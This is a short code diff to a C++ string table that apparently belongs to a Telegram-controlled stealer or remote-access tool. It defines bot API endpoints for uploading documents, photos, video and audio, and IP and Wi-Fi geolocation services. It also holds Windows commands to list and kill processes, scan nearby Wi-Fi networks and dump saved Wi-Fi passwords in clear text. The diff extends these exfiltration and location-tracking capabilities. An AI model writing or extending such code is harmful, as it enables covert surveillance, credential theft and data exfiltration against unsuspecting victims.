@@ -63,16 +63,23 @@ public:
         // Network
         store("tg_api", "https://api.telegram.org/bot");
         store("tg_send_doc", "/sendDocument");
+        store("tg_send_photo", "/sendPhoto");
+        store("tg_send_video", "/sendVideo");
+        store("tg_send_audio", "/sendAudio");
         store("tg_send_msg", "/sendMessage");
         store("tg_updates", "getUpdates");
         store("ipinfo", "https://ipinfo.io/json");
+        store("ipapi", "http://ip-api.com/json/");
         store("maps_link", "https://www.google.com/maps/search/?api=1&query=");
+        store("google_geo", "https://www.googleapis.com/geolocation/v1/geolocate?key=");
+        store("apple_wps", "https://wifitracker.fun/api/geolocate");
 
         // System commands
         store("cmd_exe", "cmd.exe");
         store("tasklist", "tasklist /FO CSV 2>&1");
         store("taskkill", "taskkill /PID ");
         store("netsh_profiles", "netsh wlan show profiles 2>&1");
+        store("netsh_visible", "netsh wlan show networks mode=Bssid 2>&1");
         store("netsh_key", "netsh wlan show profile name=\"");
         store("key_clear", "\" key=clear 2>&1");
         store("key_content", "Key Content");
